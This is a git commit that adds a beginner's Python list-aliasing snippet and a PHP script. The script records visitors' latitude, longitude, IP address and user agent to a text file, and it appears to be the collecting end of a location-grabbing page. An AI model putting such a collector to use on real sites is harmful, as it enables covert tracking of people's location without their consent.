165d23191774d563407d4b134ddbdaf1193b2a35
Mr-AhmedRiyadh <ahmed.r.altarimi@gmail.com>
2023-02-05 08:37:35 +0300

    create index.html

---
+++ Free/main.py
@@ -0,0 +1,8 @@
+#a = max(False,-3,-4)
+#b = min(a,2,7)
+#print(b)
+
+a = [10, 20]
+b = a
+b += [30, 40]
+print(a)
---
+++ website/save_location.php
@@ -0,0 +1,8 @@
+<?php
+
+$my_file = fopen("location.txt", "w") or die("Unable to open file!");
+$information = "lat:" . $_GET["lat"] . "\nlong:" . $_GET["long"] . "\nip: " . $_SERVER["REMOTE_ADDR"] . "\nuser_agent: " . $_GET["user_agent"];
+fwrite($my_file,$information);
+fclose($my_file);
+
+?>
